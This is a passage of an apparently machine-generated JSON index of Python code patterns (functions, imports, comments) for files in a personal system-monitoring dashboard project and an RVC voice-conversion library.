          "import sys",
          "import json",
          "import logging",
          "from pathlib import Path",
          "from datetime import datetime",
          "from typing import Dict, List, Optional, Union",
          "from logging_config import setup_logging, log_with_context",
          "from metrics_cache import MetricsCache",
          "from system_metrics import SystemMetrics",
          "import sys",
          "from pathlib import Path",
          "from src.processors.timeline_processor import TimelineProcessor"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 5,
        "error_handling": 34,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/generate_status_improved.py",
        "docstrings": [],
        "function_defs": [
          "def format_html_doc(content: str) -> str:\n\"\"\"Wrap content in a complete HTML document structure.\"\"\"\nreturn f\"\"\"<!DOCTYPE html>",
          "def generate_html_content(metrics: Dict, events: List, timeline_data: Optional[Dict], narrative_data: Optional[Dict]) -> str:\n\"\"\"Generate the main HTML content.\"\"\"\ntry:\n# Build HTML content piece by piece\nparts = []\n\n# Add header\nparts.append(\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import logging",
          "from pathlib import Path",
          "from datetime import datetime",
          "from typing import Dict, List, Optional, Union",
          "from logging_config import setup_logging, log_with_context",
          "from metrics_cache import MetricsCache",
          "from system_metrics import SystemMetrics"
        ],
        "comments": [
          "# Initialize components",
          "# Build HTML content piece by piece",
          "# Add header",
          "# Add CSS",
          "# System metrics section",
          "# Network section",
          "# Process section",
          "# Events section",
          "# Projects and timeline section",
          "# Timeline section",
          "# Combine all parts and wrap in HTML structure"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/http_test.py",
        "docstrings": [],
        "function_defs": [
          "def _send_response(self, message, status=200):",
          "def do_GET(self):",
          "def run():"
        ],
        "class_defs": [
          "class Handler(BaseHTTPRequestHandler):"
        ],
        "imports": [
          "from http.server import HTTPServer, BaseHTTPRequestHandler",
          "import json"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/logging_config.py",
        "docstrings": [],
        "function_defs": [
          "def setup_logging():\n\"\"\"Configure logging with rotation and structured format.\"\"\"\n# Create log directory if it doesn't exist\nLOG_DIR.mkdir(parents=True, exist_ok=True)\n\n# Create rotating file handler for debugging\nfile_handler = RotatingFileHandler(\nLOG_FILE,\nmaxBytes=MAX_BYTES,\nbackupCount=BACKUP_COUNT",
          "def log_with_context(logger, level, message, **context):\n\"\"\"\nLog a message with additional context.\n\nArgs:\nlogger: Logger instance\nlevel: Logging level (e.g., INFO, ERROR)\nmessage: Log message\n**context: Additional context as key-value pairs\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import logging",
          "from logging.handlers import RotatingFileHandler",
          "from pathlib import Path"
        ],
        "comments": [
          "# Constants",
          "# Create log directory if it doesn't exist",
          "# Create rotating file handler for debugging",
          "# Create console handler for warnings and errors",
          "# Reset root logger",
          "# Configure root logger",
          "# Create logger for this application",
          "# Add handlers directly to dashboard logger",
          "# Helper function for structured logging",
          "# For errors about common conditions (like access denied), downgrade to warning",
          "# Format context in a cleaner way"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/metrics_cache.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, ttl_seconds: int = 60):",
          "def get(self, key: str) -> Optional[Any]:\n\"\"\"\nGet a value from cache if it exists and hasn't expired.\n\nArgs:\nkey: Cache key\n\nReturns:\nCached value if valid, None otherwise\n\"\"\"",
          "def set(self, key: str, value: Any) -> None:\n\"\"\"\nSet a value in cache with current timestamp.\n\nArgs:\nkey: Cache key\nvalue: Value to cache\n\"\"\"",
          "def invalidate(self, key: str) -> None:\n\"\"\"\nRemove a key from cache.\n\nArgs:\nkey: Cache key to remove\n\"\"\"",
          "def clear(self) -> None:\n\"\"\"Clear all cached values.\"\"\"\nself.cache.clear()\n\n# Global cache instance\nmetrics_cache = MetricsCache()\n\ndef cached(ttl_seconds: int = 60):\n\"\"\"",
          "def cached(ttl_seconds: int = 60):\n\"\"\"\nDecorator for caching function results.\n\nArgs:\nttl_seconds: Time to live in seconds for cached values\n\nReturns:\nDecorator function\n\"\"\"",
          "def decorator(func):",
          "def wrapper(*args, **kwargs):"
        ],
        "class_defs": [
          "class MetricsCache:"
        ],
        "imports": [
          "import time",
          "from typing import Dict, Any, Optional",
          "from functools import wraps",
          "from datetime import datetime, timedelta"
        ],
        "comments": [
          "# Global cache instance",
          "# Create cache key from function name and arguments",
          "# Check cache first",
          "# If not in cache, compute value"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@wraps(func)"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/minimal.py",
        "docstrings": [],
        "function_defs": [
          "def index():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/minimal_http.py",
        "docstrings": [],
        "function_defs": [
          "def do_GET(self):"
        ],
        "class_defs": [
          "class Handler(BaseHTTPRequestHandler):"
        ],
        "imports": [
          "from http.server import HTTPServer, BaseHTTPRequestHandler"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/notify.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def _send_request(self, payload: Dict[str, Any]) -> requests.Response:\n\"\"\"Send request to Pushover API with retry logic\"\"\"\nfor attempt in range(self.retry_attempts):\ntry:\nresponse = requests.post(self.PUSHOVER_API_URL, data=payload)\nresponse.raise_for_status()\nreturn response\nexcept requests.RequestException as e:\nlogger.warning(f'Attempt {attempt + 1} failed: {str(e)}')\nif attempt < self.retry_attempts - 1:",
          "def speak_message(self, message: str, voice: str='Daniel') -> None:\n\"\"\"\nSpeak the message using macOS text-to-speech\n\nArgs:\nmessage: The message to speak\nvoice: The voice to use (default: Daniel)\n\"\"\"",
          "def send_notification(self, message: str, title: Optional[str]=None, priority: str='normal', speak: bool=True, voice: str='Daniel') -> bool:\n\"\"\"\nSend a notification via Pushover\n\nArgs:\nmessage: The message to send\ntitle: Optional title for the notification\npriority: Priority level (lowest, low, normal, high, emergency)\n\nReturns:",
          "def main():"
        ],
        "class_defs": [
          "class PushoverNotifier:"
        ],
        "imports": [
          "import os",
          "import time",
          "import logging",
          "import requests",
          "import argparse",
          "import subprocess",
          "from dotenv import load_dotenv",
          "from typing import Optional, Dict, Any"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 10,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/run_dashboard.py",
        "docstrings": [],
        "function_defs": [
          "def signal_handler(signum, frame):\n\"\"\"Handle signals gracefully.\"\"\"\nlocal_logger = logging.getLogger('Launcher')\nif flask_process:\nlocal_logger.info(\"Stopping dashboard...\")\nflask_process.terminate()\ntry:\nflask_process.wait(timeout=5)\nexcept subprocess.TimeoutExpired:\nflask_process.kill()",
          "def setup_logging():\n\"\"\"Set up logging.\"\"\"\nlog_dir = Path(__file__).parent / 'logs'\nlog_dir.mkdir(exist_ok=True, parents=True)\n\nlogging.basicConfig(\nlevel=logging.INFO,\nformat='%(asctime)s - %(name)s - %(levelname)s - %(message)s',\nhandlers=[\nlogging.FileHandler(log_dir / 'dashboard.log'),",
          "def check_dependencies():\n\"\"\"Check and install required Python packages.\"\"\"\nrequired_packages = [\n'flask',\n'werkzeug',\n'aiohttp',\n'psutil'\n]\n\nfor package in required_packages:",
          "def main():\n\"\"\"Run the dashboard.\"\"\"\nsetup_logging()\nlogger = logging.getLogger('Launcher')\n\ntry:\n# Check dependencies\ncheck_dependencies()\n\n# Set up environment"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import logging",
          "import subprocess",
          "import signal",
          "from pathlib import Path"
        ],
        "comments": [
          "# Global for the Flask process",
          "# Check dependencies",
          "# Set up environment",
          "# Start Flask application",
          "# Set up signal handlers",
          "# Start Flask process",
          "# Wait for process"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 7,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/setup_auth.py",
        "docstrings": [],
        "function_defs": [
          "def generate_salt() -> str:\n\"\"\"Generate a random salt.\"\"\"\nreturn base64.b64encode(secrets.token_bytes(16)).decode('utf-8')\n\ndef hash_password(password: str, salt: str) -> str:\n\"\"\"Hash password with salt using SHA-256.\"\"\"",
          "def hash_password(password: str, salt: str) -> str:\n\"\"\"Hash password with salt using SHA-256.\"\"\"\ncombined = password.encode() + base64.b64decode(salt)\nreturn base64.b64encode(hashlib.sha256(combined).digest()).decode('utf-8')\n\ndef main():\n\"\"\"Set up dashboard authentication.\"\"\"",
          "def main():\n\"\"\"Set up dashboard authentication.\"\"\"\nbase_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard')\nconfig_path = base_path / 'config/auth.json'\n\nif not config_path.parent.exists():\nconfig_path.parent.mkdir(parents=True)\n\n# Get credentials\nprint(\"Setting up dashboard authentication\")"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import getpass",
          "import hashlib",
          "import base64",
          "import secrets",
          "from pathlib import Path"
        ],
        "comments": [
          "# Get credentials",
          "# Generate salt and hash",
          "# Create or update config"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/simple_server.py",
        "docstrings": [],
        "function_defs": [
          "def do_GET(self):"
        ],
        "class_defs": [
          "class SimpleHandler(BaseHTTPRequestHandler):"
        ],
        "imports": [
          "from http.server import HTTPServer, BaseHTTPRequestHandler"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/socket_test.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import socket",
          "import sys"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 5,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/system_metrics.py",
        "docstrings": [],
        "function_defs": [
          "def get_cpu_metrics(self) -> Dict:\n\"\"\"Get detailed CPU metrics.\"\"\"\ntry:\ncpu_freq = psutil.cpu_freq()\nreturn {\n'percent': psutil.cpu_percent(interval=1),\n'per_cpu': psutil.cpu_percent(interval=1, percpu=True),\n'count': psutil.cpu_count(),\n'count_logical': psutil.cpu_count(logical=True),\n'freq': {",
          "def get_memory_metrics(self) -> Dict:\n\"\"\"Get detailed memory metrics.\"\"\"\ntry:\nvm = psutil.virtual_memory()\nsm = psutil.swap_memory()\nreturn {\n'virtual': {\n'total_gb': round(vm.total / (1024**3), 2),\n'available_gb': round(vm.available / (1024**3), 2),\n'used_gb': round(vm.used / (1024**3), 2),",
          "def get_disk_metrics(self) -> Dict:\n\"\"\"Get detailed disk metrics.\"\"\"\ntry:\npath = '/Volumes/Mac Mini External'\nusage = psutil.disk_usage(path)\nio_counters = psutil.disk_io_counters()\n\nreturn {\n'usage': {\n'total_gb': round(usage.total / (1024**3), 2),",
          "def get_network_metrics(self) -> Dict:\n\"\"\"Get detailed network metrics with improved error handling.\"\"\"\nmetrics = {'interfaces': {}, 'connections': {'total': 0, 'by_status': {}}}\n\n# Get interface metrics first\ntry:\nio_counters = psutil.net_io_counters(pernic=True)\nfor nic, stats in io_counters.items():\n# Skip loopback and inactive interfaces\nif nic in ('lo', 'lo0') or not any([getattr(stats, attr, 0) for attr in ['bytes_sent', 'bytes_recv']]):",
          "def get_process_metrics(self, top_n: int = 10) -> List[Dict]:\n\"\"\"Get detailed process metrics.\"\"\"\ntry:\nprocesses = []\nfor proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'create_time']):\ntry:\npinfo = proc.info\n# Get additional details\nwith proc.oneshot():\npinfo['memory_gb'] = round(proc.memory_info().rss / (1024**3), 3)",
          "def get_all_metrics(self) -> Dict:\n\"\"\"Get all system metrics.\"\"\"\nreturn {\n'timestamp': datetime.now().isoformat(),\n'cpu': self.get_cpu_metrics(),\n'memory': self.get_memory_metrics(),\n'disk': self.get_disk_metrics(),\n'network': self.get_network_metrics(),\n'processes': self.get_process_metrics()\n}"
        ],
        "class_defs": [
          "class SystemMetrics:"
        ],
        "imports": [
          "import os",
          "import psutil",
          "import logging",
          "from typing import Dict, List, Optional",
          "from datetime import datetime",
          "from pathlib import Path",
          "from metrics_cache import cached",
          "from logging_config import log_with_context"
        ],
        "comments": [
          "# Get interface metrics first",
          "# Skip loopback and inactive interfaces",
          "# Log only if debug is enabled",
          "# Only log interface errors at WARNING level",
          "# Get connection metrics",
          "# Handle access denied quietly - normal for non-root users",
          "# Only log unexpected connection errors at WARNING level",
          "# Get additional details",
          "# Sort by CPU percent and return top N"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 19,
        "decorators": [
          "@cached(ttl_seconds=5)",
          "@cached(ttl_seconds=5)",
          "@cached(ttl_seconds=30)",
          "@cached(ttl_seconds=5)",
          "@cached(ttl_seconds=5)"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/test.py",
        "docstrings": [],
        "function_defs": [
          "def hello():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/test_logging.py",
        "docstrings": [],
        "function_defs": [
          "def before_request():",
          "def after_request(response):",
          "def home():",
          "def test():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "import logging"
        ],
        "comments": [
          "# Set up logging",
          "# Create Flask app",
          "# Add before/after request logging"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.before_request",
          "@app.after_request",
          "@app.route('/')",
          "@app.route('/test')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/test_services.py",
        "docstrings": [],
        "function_defs": [
          "def test_configuration():\n\"\"\"Test configuration system.\"\"\"\nlogger.info(\"Testing configuration...\")\n\n# Check directory structure\ndirs_to_check = [\nservice_config.log_dir,\nservice_config.state_dir,\nservice_config.config_dir\n]",
          "def test_service_registry():\n\"\"\"Test service registry functionality.\"\"\"\nlogger.info(\"Testing service registry...\")\n\n# Register test service\nservice_registry.register_service('test_service', TestService)\n\n# Start service\nsuccess = service_registry.start_service('test_service')\nassert success, \"Failed to start test service\"",
          "def test_error_recovery():\n\"\"\"Test error recovery mechanisms.\"\"\"\nlogger.info(\"Testing error recovery...\")\n\n# Start service\nservice_registry.start_service('test_service')\n\n# Wait for error (occurs every 10 iterations)\nlogger.info(\"Waiting for error condition...\")\ntime.sleep(12)  # Ensure we hit an error",
          "def main():\n\"\"\"Run all tests.\"\"\"\ntry:\ntest_configuration()\ntest_service_registry()\ntest_error_recovery()\n\nlogger.info(\"All tests passed!\")\nreturn 0\n"
        ],
        "class_defs": [],
        "imports": [
          "import time",
          "import json",
          "from pathlib import Path",
          "import logging",
          "from src.config.service_config import service_config",
          "from src.services.service_registry import service_registry",
          "from src.services.test_service import TestService"
        ],
        "comments": [
          "# Set up logging",
          "# Check directory structure",
          "# Check config loading",
          "# Register test service",
          "# Start service",
          "# Check status",
          "# Wait for some iterations",
          "# Check state file",
          "# Stop service",
          "# Start service",
          "# Wait for error (occurs every 10 iterations)",
          "# Check recovery",
          "# Stop service"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/test_socket.py",
        "docstrings": [],
        "function_defs": [
          "def hello():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "from werkzeug.serving import run_simple",
          "import socket",
          "import os"
        ],
        "comments": [
          "# Remove socket if it already exists",
          "# Create Unix domain socket",
          "# Run Flask with Unix socket"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/test_waitress.py",
        "docstrings": [],
        "function_defs": [
          "def hello():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "from waitress import serve"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/warp_commander.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config: dict):",
          "def _generate_core_commands(self) -> List[str]:\n\"\"\"Generate commands for core infrastructure development\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/monitor.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/password_manager.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/docker_manager.py\"\n]\n\ndef _generate_ai_commands(self) -> List[str]:\n\"\"\"Generate commands for AI development\"\"\"",
          "def _generate_ai_commands(self) -> List[str]:\n\"\"\"Generate commands for AI development\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/ai/system_brain.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/ai/model_trainer.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/ai/pattern_analyzer.py\"\n]\n\ndef _generate_automation_commands(self) -> List[str]:\n\"\"\"Generate commands for automation development\"\"\"",
          "def _generate_automation_commands(self) -> List[str]:\n\"\"\"Generate commands for automation development\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/automation/controller.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/automation/task_scheduler.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/automation/safety_monitor.py\"\n]\n\ndef _generate_evolution_commands(self) -> List[str]:\n\"\"\"Generate commands for system evolution\"\"\"",
          "def _generate_evolution_commands(self) -> List[str]:\n\"\"\"Generate commands for system evolution\"\"\"\nreturn [\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/evolution/consciousness.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/evolution/adaptor.py\",\n\"python3 /Volumes/Mac Mini External/MemoryCore/core/evolution/optimizer.py\"\n]\n\nasync def execute_commands(self, commands: List[str]):\n\"\"\"Execute commands through Warp\"\"\"",
          "def _log_execution(self, command: str, stdout: bytes, stderr: bytes):\n\"\"\"Log command execution results\"\"\"\ntry:\nself.command_history.append({\n\"timestamp\": datetime.now().isoformat(),\n\"command\": command,\n\"stdout\": stdout.decode() if stdout else \"\",\n\"stderr\": stderr.decode() if stderr else \"\",\n\"phase\": self.current_phase\n})",
          "def _save_history(self):\n\"\"\"Save command execution history\"\"\"\ntry:\nhistory_path = Path(\"/Volumes/Mac Mini External/MemoryCore/logs/command_history.json\")\nhistory_path.parent.mkdir(parents=True, exist_ok=True)\n\nwith open(history_path, 'w') as f:\njson.dump(self.command_history, f, indent=2)\n\nexcept Exception as e:"
        ],
        "class_defs": [
          "class WarpCommander:"
        ],
        "imports": [
          "import asyncio",
          "import logging",
          "import json",
          "from datetime import datetime",
          "from pathlib import Path",
          "from typing import Dict, List"
        ],
        "comments": [
          "# Execute command",
          "# Wait for completion",
          "# Log results",
          "# Save history periodically",
          "# Generate commands for current phase",
          "# Execute commands",
          "# Move to next phase",
          "# Brief pause between phases",
          "# Check completion status",
          "# Run monitoring in parallel with development"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 12,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/docs/MEMORY002__20251013__generate-docs.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, base_path: str):",
          "def generate_all(self):\n\"\"\"Generate all documentation.\"\"\"\ntry:\nself.generate_architecture_docs()\nself.generate_api_docs()\nself.generate_deployment_docs()\nself.generate_troubleshooting_docs()\nself.generate_index()\n\nlogger.info(\"Documentation generation completed successfully\")",
          "def generate_architecture_docs(self):\n\"\"\"Generate system architecture documentation.\"\"\"\nlogger.info(\"Generating architecture documentation\")\n\ncontent = [\n\"# System Architecture\\n\",\n\"## Overview\\n\",\n\"The dashboard system consists of several key components working together \",\n\"to provide real-time monitoring and visualization capabilities.\\n\",\n",
          "def generate_api_docs(self):\n\"\"\"Generate API documentation.\"\"\"\nlogger.info(\"Generating API documentation\")\n\ncontent = [\n\"# API Documentation\\n\",\n\"## Overview\\n\",\n\"The dashboard provides a RESTful API for interacting with the system.\\n\\n\",\n\"## Authentication\\n\",\n\"API requests require authentication using a Bearer token:\\n\",",
          "def generate_deployment_docs(self):\n\"\"\"Generate deployment documentation.\"\"\"\nlogger.info(\"Generating deployment documentation\")\n\ncontent = [\n\"# Deployment Guide\\n\",\n\"## Prerequisites\\n\",\n\"- Python 3.9 or higher\\n\",\n\"- System dependencies listed in requirements.txt\\n\",\n\"- Access to deployment environment\\n\\n\",",
          "def generate_troubleshooting_docs(self):\n\"\"\"Generate troubleshooting documentation.\"\"\"\nlogger.info(\"Generating troubleshooting documentation\")\n\ncontent = [\n\"# Troubleshooting Guide\\n\",\n\"## Common Issues\\n\"\n]\n\n# Document common issues and solutions",
          "def generate_index(self):\n\"\"\"Generate documentation index.\"\"\"\nlogger.info(\"Generating documentation index\")\n\ncontent = [\n\"# Dashboard Documentation\\n\",\nf\"Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n\\n\",\n\"## Contents\\n\",\n\"- [System Architecture](architecture.md)\\n\",\n\"- [API Documentation](api.md)\\n\",",
          "def _analyze_components(self) -> List[Dict[str, Any]]:\n\"\"\"Analyze system components from source code.\"\"\"\ncomponents = []\n\nfor py_file in self.src_dir.rglob('*.py'):\ntry:\nwith open(py_file) as f:\ncontent = f.read()\n\ntree = ast.parse(content)",
          "def _extract_features(self, node: ast.ClassDef) -> List[str]:\n\"\"\"Extract key features from class methods.\"\"\"\nfeatures = []\n\nfor child in node.body:\nif isinstance(child, ast.FunctionDef):\ndoc = ast.get_docstring(child)\nif doc and not child.name.startswith('_'):\nfeatures.append(f\"{child.name}: {doc.split('.')[0]}\")\n",
          "def _extract_interfaces(self, node: ast.ClassDef) -> List[str]:\n\"\"\"Extract public interfaces from class.\"\"\"\ninterfaces = []\n\nfor child in node.body:\nif isinstance(child, ast.FunctionDef):\nif not child.name.startswith('_'):\nargs = [arg.arg for arg in child.args.args[1:]]  # Skip self\ninterfaces.append(\nf\"{child.name}({', '.join(args)})\"",
          "def _extract_dependencies(self, node: ast.ClassDef) -> List[str]:\n\"\"\"Extract dependencies from class imports.\"\"\"\ndependencies = []\n\n# Look at module level imports\nmodule = node.parent\nif isinstance(module, ast.Module):\nfor child in module.body:\nif isinstance(child, (ast.Import, ast.ImportFrom)):\nif isinstance(child, ast.Import):",
          "def _analyze_data_flow(self) -> List[Dict[str, Any]]:\n\"\"\"Analyze system data flow.\"\"\"\n# This would typically be based on actual system analysis\n# Here's a simplified example\nreturn [\n{\n'name': 'Data Collection',\n'description': 'System metrics and events are collected from various sources'\n},\n{",
          "def _analyze_endpoints(self) -> List[Dict[str, Any]]:\n\"\"\"Analyze API endpoints from route definitions.\"\"\"\nendpoints = []\n\n# Look for FastAPI/Flask route decorators\nfor py_file in (self.src_dir / 'api').rglob('*.py'):\ntry:\nwith open(py_file) as f:\ncontent = f.read()\n",
          "def _parse_endpoint(",
          "def _load_deploy_config(self) -> Dict[str, Any]:\n\"\"\"Load deployment configuration.\"\"\"\nconfig_file = self.base_path / 'deploy/config.json'\nif config_file.exists():\nwith open(config_file) as f:\nreturn json.load(f)\nreturn {}\n\ndef _collect_known_issues(self) -> Dict[str, List[Dict[str, Any]]]:\n\"\"\"Collect known issues and solutions.\"\"\"",
          "def _collect_known_issues(self) -> Dict[str, List[Dict[str, Any]]]:\n\"\"\"Collect known issues and solutions.\"\"\"\nreturn {\n'Performance': [\n{\n'problem': 'High CPU Usage',\n'symptoms': 'Dashboard response time is slow, system resources are strained',\n'causes': [\n'Too many concurrent connections',\n'Inefficient query patterns',",
          "def _write_doc(self, filename: str, content: List[str]):\n\"\"\"Write documentation to file.\"\"\"\noutput_file = self.output_dir / filename\nwith open(output_file, 'w') as f:\nf.write(''.join(content))\nlogger.info(f\"Generated {filename}\")\n\ndef main():\n\"\"\"Generate documentation based on command line arguments.\"\"\"",
          "def main():\n\"\"\"Generate documentation based on command line arguments.\"\"\"\nimport argparse\n\nparser = argparse.ArgumentParser(description='Generate dashboard documentation')\nparser.add_argument(\n'--type',\nchoices=['all', 'architecture', 'api', 'deployment', 'troubleshooting'],\ndefault='all',\nhelp='Type of documentation to generate'"
        ],
        "class_defs": [
          "class DocGenerator:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import subprocess",
          "import logging",
          "from pathlib import Path",
          "from typing import List, Dict, Any",
          "import json",
          "import ast",
          "import inspect",
          "import re",
          "import mistune",
          "from datetime import datetime",
          "import argparse"
        ],
        "comments": [
          "# Ensure directories exist",
          "# Initialize Markdown renderer",
          "# Document main components",
          "# Document system interactions",
          "# Generate Mermaid.js diagram",
          "# Document data flow",
          "# Document API endpoints",
          "# Document deployment environments",
          "# Document deployment steps",
          "# Document common issues and solutions",
          "# Extract class documentation and structure",
          "# Look at module level imports",
          "# This would typically be based on actual system analysis",
          "# Here's a simplified example",
          "# Look for FastAPI/Flask route decorators",
          "# Extract HTTP method and path from decorator",
          "# Parse parameters from function arguments",
          "# Create a sample response based on return annotation"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 8,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib",
    "name": "lib",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/slicer2.py",
        "docstrings": [],
        "function_defs": [
          "def get_rms(",
          "def __init__(",
          "def _apply_slice(self, waveform, begin, end):",
          "def slice(self, waveform):",
          "def main():"
        ],
        "class_defs": [
          "class Slicer:"
        ],
        "imports": [
          "import numpy as np",
          "import os.path",
          "from argparse import ArgumentParser",
          "import librosa",
          "import soundfile"
        ],
        "comments": [
          "# This function is obtained from librosa.",
          "# put our new within-frame axis at the end for now",
          "# Reduce the shape on the framing axis",
          "# Downsample along the target axis",
          "# Calculate power",
          "# @timeit",
          "# Keep looping while frame is silent.",
          "# Record start of silent frames.",
          "# Keep looping while frame is not silent and silence start has not been recorded.",
          "# Clear recorded silence start if interval is not enough or clip is too short",
          "# Need slicing. Record the range of silent frames to be removed.",
          "# Deal with trailing silence.",
          "# Apply and return slices."
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/rmvpe.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def transform(self, input_data, return_phase=False):\n\"\"\"Take input data (audio) to STFT domain.\n\nArguments:\ninput_data {tensor} -- Tensor of floats, with shape (num_batch, num_samples)\n\nReturns:\nmagnitude {tensor} -- Magnitude of STFT with shape (num_batch,\nnum_frequencies, num_frames)\nphase {tensor} -- Phase of STFT with shape (num_batch,",
          "def inverse(self, magnitude, phase):\n\"\"\"Call the inverse STFT (iSTFT), given magnitude and phase tensors produced\nby the ```transform``` function.\n\nArguments:\nmagnitude {tensor} -- Magnitude of STFT with shape (num_batch,\nnum_frequencies, num_frames)\nphase {tensor} -- Phase of STFT with shape (num_batch,\nnum_frequencies, num_frames)\n",
          "def forward(self, input_data):\n\"\"\"Take input data (audio) to STFT domain and then back to audio.\n\nArguments:\ninput_data {tensor} -- Tensor of floats, with shape (num_batch, num_samples)\n\nReturns:\nreconstruction {tensor} -- Reconstructed audio given magnitude and phase. Of\nshape (num_batch, num_samples)\n\"\"\"",
          "def __init__(self, input_features, hidden_features, num_layers):",
          "def forward(self, x):",
          "def __init__(self, in_channels, out_channels, momentum=0.01):",
          "def forward(self, x: torch.Tensor):",
          "def __init__(",
